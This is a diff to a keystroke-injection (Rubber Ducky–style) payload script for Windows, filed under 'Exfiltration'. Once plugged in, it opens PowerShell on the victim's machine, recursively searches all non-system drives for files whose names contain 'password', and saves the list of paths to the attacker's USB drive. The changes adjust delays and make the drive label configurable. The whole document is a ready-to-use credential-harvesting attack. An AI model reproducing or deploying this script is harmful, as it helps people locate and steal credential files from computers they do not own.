@@ -5,22 +5,20 @@ REM Target: 		Windows
 REM Version: 		1.0
 REM Category: 		Exfiltration
 
+REM Define the drive label where you want to save the file. The default label is DUCKY. Rename your Pico drive to DUCKY for it to work properly. (optional)
+DEFINE #DRIVE_LABEL DUCKY
+
 ATTACKMODE HID STORAGE
 
-DELAY 200
+DELAY 500
 GUI r
 
-DELAY 100
-STRING powershell 
-ENTER
+DELAY 300
+STRINGLN powershell
 
 DELAY 1000
-STRING $DRIVE_LABEL = 'DUCKY';$m=(Get-Volume -FileSystemLabel $DRIVE_LABEL).DriveLetter; Get-PSDrive -PSProvider FileSystem | Where-Object Name -ne 'C' | ForEach-Object { Get-ChildItem ($_.Name + ':\') -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'password' } | Select-Object -ExpandProperty FullName }>>$m':\'$env:computername'.txt'
-ENTER
-
-DELAY 100
-STRING EXIT
-ENTER
+STRINGLN $m=(Get-Volume -FileSystemLabel #DRIVE_LABEL).DriveLetter; Get-PSDrive -PSProvider FileSystem | Where-Object Name -ne 'C' | ForEach-Object { Get-ChildItem ($_.Name + ':\') -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'password' } | Select-Object -ExpandProperty FullName }>>$m':\'$env:computername'.txt'
+STRINGLN exit
 
 REM The drive letter of the volume labeled "DUCKY" is stored in the variable $m. You can change this by defining DRIVE_LABEL.
 REM It will take time, as it scans all the drives.
